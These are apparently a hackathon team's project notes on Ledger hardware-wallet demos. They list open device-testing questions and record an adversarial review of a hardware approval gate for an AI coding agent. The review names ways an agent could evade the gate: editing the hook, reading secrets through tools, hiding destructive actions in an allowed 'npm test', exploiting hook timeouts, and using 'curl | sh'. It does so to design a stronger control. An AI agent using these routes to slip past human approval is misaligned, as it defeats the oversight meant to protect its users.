Gates for all top picks (`research/gap-windows-hid-coexistence-ledger-live.md` §TL;DR, `research/voice-face-agent-feasibility.md` §11, `spikes/node-hid-windows`, `spikes/host-capabilities`):

1. Do both devices enumerate on first USB plug-in with no driver step (zero `VID_2C97` entries exist today)? Does Chrome 153 see them over WebHID with Ledger Wallet fully quit?
2. Does `spikes/node-hid-windows/connect-and-get-address.mjs` complete on the real Flex and Nano S Plus on Node 24 (the no-device path is verified; the device path is not)?
3. Does a real `signMessage` round-trip on each device, and how many pages does a 120-character EIP-191 line take on the Nano S Plus (Speculos showed about 3 lines per page)?
4. What firmware and Ethereum app versions are the two units on after a Ledger Wallet update, and does app open/close re-enumerate USB for up to 6 s as the note predicts?
5. Do the two devices share a seed? This decides whether a Nano can revoke or co-sign for a Flex (I14, I10, I06 two-device clips, I05) or whether both addresses must be whitelisted.
6. Can two node-hid sessions (one per model) be open at once on Windows, or must the two-person tier connect sequentially (I11, I15)?

Custom app (I06, I03) from `research/custom-device-apps-bolos-speculos.md` §4.2 and §8:

7. Do both device OSes expose API_LEVEL 27 so the `v27.1.2` SDK build installs, or does sideload return `0x511F`? Check with `ledger-binary -j` and by trying the install.
8. Does `ledgerblue.runScript --scp` work from the native Windows venv (install verified; sideload inferred)?
9. Does `ledger_device_sdk::nvm::AtomicStorage` persist across a power cycle on the real Flex, and does it coexist with the `io_new` feature?
10. Does a custom Rust app answer DMK's GetAppAndVersion poll, or must the host use raw node-hid or ledgercomm?
11. (I03 only) Does BOLOS route NFC APDUs to a third-party `ENABLE_NFC=1` app, and is an ISO SELECT required? Four-hour hard stop with Speculos `--transport NFC` and then a Play-store APDU-sender app.

Key Ring (I10, I14's optional backend) from `research/key-ring.md` §10, `research/gap-key-ring-recovery-and-rotation-semantics.md` §7, `research/ledger-cli-agent-stack.md` §10:

12. Does native `wallet-cli.exe` enumerate the devices without a driver swap (no-device commands pass; enumeration untested)?
13. What is the minimum Ledger Sync app version for `ring init`, and what does the device show at enrolment?
14. Does `removeMember` on app 17 with a device tap work on production, and does it rotate only the ring branch or everything (the docs sentence disagrees with the code)?
15. Is `WALLET_PASS` from Credential Manager via PowerShell accepted on every piped call, and where does `session.yaml` land on Windows?

Clear signing (I01, any money rail) from `research/gap-clear-signing-without-origin-token.md` §11 and `research/clear-signing-erc7730.md` §9:

16. What exactly does the Flex and the Nano S Plus render for a tUSDC transfer on Base Sepolia (amount, ticker, network name), with no originToken? Ten-minute test, decides ETH-versus-tUSDC by end of Day 1.
17. Can a mentor hand out a `GATING_TOKEN` for the week (ask on Discord Monday; nothing in the top three needs it)?
18. Where does Base Sepolia gas come from for an ERC-20 transfer, given the Circle faucet gives tUSDC only?

Security Key (I08, I02, the ssh-sk timebox in I11) from `research/hardware-security-fido-pgp-ssh.md`:

19. Does the Flex Security Key app assert over NFC to the team's actual phone (verified only for iPhone plus webauthn.io; Android needs 14+ with a 2024-03 Play update), and does `ssh-keygen -t ed25519-sk` enrol through Windows OpenSSH with the Nano in the Security Key app?
20. Does the Security Key app coexist with the Ethereum app in one demo without a USB re-enumeration the host cannot script?

## 7. Second opinion (independent adversarial review, 2026-10-10)

An independent reviewer (a different model, read-only, cross-checking against `research/` and `spikes/`) was asked to puncture the ranking. Its verdict and corrections, kept here because they change the build:

Verdict: I11 is a conditional first, not a clear winner. A Bash hook with regex tiers does not justify "hardware sudo": the device protects signing, software still decides what needs approval and what executes afterward. Technical execution plus UX plus clarity are 50% of the rubric, so a finished, legible demo beats an unverified Secure Element upgrade. Reviewer's top three: I11 narrowed to one privileged operation with a verifier that owns the credential; I14 with the consent-evidence vs confidentiality-enforcement distinction stated; I15 Minute Book, which it calls substantially under-ranked (two officers catching an invented resolution gives two student presenters natural roles). I06 is over-ranked at third: run it only after the submission is complete. I01 is generous given ITHACA and live-microphone risk.

Five Q&A punctures for I11 that the build must answer:

1. What prevents bypass? The agent can edit the hook, read secrets through the Read tool, call an MCP tool, or hide destructive behaviour inside an allowed `npm test`. Show the boundary that owns the privilege, not the hook.
2. Did I approve the action or a command string? `npm publish` depends on package contents, `curl | sh` on mutable remote code. Bind artifact digest, target and context to what executes. What happens past the 160-character display limit?
3. Can yesterday's signature be replayed? Nonce, expiry, service identity, single use. For the two-person tier: two independently enrolled keys, or two devices with one seed?
4. What does the audit log prove? A signed chain authenticates the submitted history; it does not show every call was included or that an approved action ran. Detect an omitted suffix, an unlogged call, a missing final checkpoint.
5. Why keep using it? CoSig already does hardware approval for deploy and delete tools. The defensible difference is action text on trusted hardware; how many interruptions before users approve mechanically?

Factual corrections accepted:

- Calendar: Oct 10 is Saturday (fixed above).
- The spikes prove emulated signing and native package loading, not real-device signing on Windows; both emulators share one seed, so identical signatures prove nothing about independent approvers.
- Claude Code hook timeouts do not block by default: a hook that times out lets the command through unless failures are configured to block. A 300 s timeout alone is a security gap. The enforcement must sit in the thing that holds the credential, not in the hook.
- I06 cannot make approvals "undroppable": counter gaps reveal missing intermediate receipts; a deleted tail needs a fresh authenticated checkpoint. Also, Genuine Check fails on a custom CA, not on ordinary sideloading.
- I10: an evicted member keeps old keys, trees and plaintext; rotation protects new material only.
- EIP-191 readability is not ERC-7730 Clear Signing and not proof of a named human. I14's signed DENY requires the owner to approve a denial message; pressing Reject produces no signature. I01's host-generated speech is not a trusted rendering of the Secure Screen.
- Replace "nobody has" with "not found in the researched corpus".

Missed candidate, now I17 Release Seal: an agent builds a release; the Flex shows repository, version, destination and artifact digest; a publishing service holds the publish credential and releases it only against a valid signature over exactly those bytes. Alter the artifact afterwards and publishing fails. Stock EIP-191, USB, Windows, no originToken. This converges with the narrowed I11: the credential-holding verifier is the product, the hook is a convenience. Recommended build shape after this review: `ledgerd` holds the privileged credential (npm token, deploy key, or the decrypt key for I14's records) and performs the privileged action itself only after a device signature over a line that includes a nonce, an expiry and the artifact digest. The agent never holds the credential, so bypassing the hook gains nothing.
